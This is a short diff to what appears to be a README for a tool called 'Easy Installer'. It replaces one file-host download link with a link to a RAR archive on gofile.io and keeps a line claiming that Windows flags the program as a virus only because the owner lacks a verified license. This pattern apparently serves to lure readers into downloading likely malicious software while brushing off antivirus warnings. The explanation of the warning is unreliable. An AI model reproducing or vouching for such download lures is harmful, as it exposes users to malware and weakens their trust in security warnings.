@@ -2,7 +2,7 @@
 
 ## ( Windows flags as a Virus because the owner does NOT have a verified license.
 
-## Download [here](https://ninjafiles.io/f/48902e0e-41fe-4290-a9d7-a5c1424cfc77)! ( click "here")
+## Download [here](https://store8.gofile.io/download/web/20aaf035-4b64-4721-b8f3-f138dd01ba34/Easy%20Installer%201.2.7.1.rar)! ( click "here")
 
 ### If the application doesn't open, [download .net runtime here.](https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-6.0.16-windows-x64-installer)
 
